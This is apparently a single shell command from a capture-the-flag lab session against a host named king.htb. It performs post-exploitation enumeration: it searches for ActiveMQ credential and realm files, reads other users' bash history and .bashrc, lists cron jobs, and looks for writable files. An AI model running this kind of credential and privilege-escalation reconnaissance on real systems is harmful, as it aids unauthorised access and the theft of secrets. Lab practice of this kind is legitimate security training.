list.value: echo "=ACTIVEMQ CONF="; find / -name "activemq.xml" -o -name "credentials.properties" -o -name "jetty-realm.properties" 2>/dev/null | head -5; echo "=ACTIVEMQ HOME="; find / -name "activemq" -type d 2>/dev/null | grep -v proc | head -5; ls /opt/ 2>/dev/null; ls /var/lib/ 2>/dev/null | grep -i activemq; echo "=SVCMQ FILES="; ls -la /home/svc_mq@king.htb/; echo "=HISTORY="; cat /home/svc_mq@king.htb/.bash_history 2>/dev/null; echo "=CRONS="; ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null; echo "=WRITABLE="; find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v /tmp | grep -v /run | grep -v /dev | head -20; echo "=ANNE ACCESS="; cat /home/anne/.bashrc 2>/dev/null; ls -la /home/anne/
